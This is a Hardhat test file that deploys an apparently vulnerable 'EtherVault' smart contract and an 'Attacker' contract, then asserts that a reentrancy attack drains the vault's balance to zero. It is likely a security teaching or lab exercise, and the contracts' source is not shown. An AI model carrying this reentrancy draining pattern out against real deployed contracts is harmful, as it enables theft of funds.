const { expect } = require("chai");
const { ethers } = require("hardhat");



describe("EtherVault Contract", function () {
    let deployer, user, attacker;

    beforeEach(async function () {
        [deployer, user, attacker] = await ethers.getSigners();

        // Deploy EtherVault contract
        const EtherVaultFactory = await ethers.getContractFactory("EtherVault", deployer);
        this.etherVaultContract = await EtherVaultFactory.deploy();

        await this.etherVaultContract.donate({ value: ethers.utils.parseEther("100") });
        await this.etherVaultContract.connect(user).donate({ value: ethers.utils.parseEther("50") });

        // Deploy Attacker contract with deployer as signer
        const AttackerFactory = await ethers.getContractFactory("Attacker", attacker);
        this.attackerContract = await AttackerFactory.deploy(this.etherVaultContract.address);
    });

    describe("Reentrancy Attack", function () {
        it("Should drain EtherVault contract using reentrancy attack", async function () {
            console.log("");
            console.log("*** Before ***");
            console.log(`EtherVault's balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.etherVaultContract.address))}`);
            console.log(`Attacker's balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.attackerContract.address))}`);

            // Perform the attack with 10 ETH
            await this.attackerContract.attack({ value: ethers.utils.parseEther("10") });

            console.log("");
            console.log("*** After ***");
            console.log(`EtherVault's balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.etherVaultContract.address))}`);
            console.log(`Attacker's balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.attackerContract.address))}`);
            console.log("");

            // Assert that EtherVault's balance is drained
            expect(await ethers.provider.getBalance(this.etherVaultContract.address)).to.equal(0);
        });
    });
});
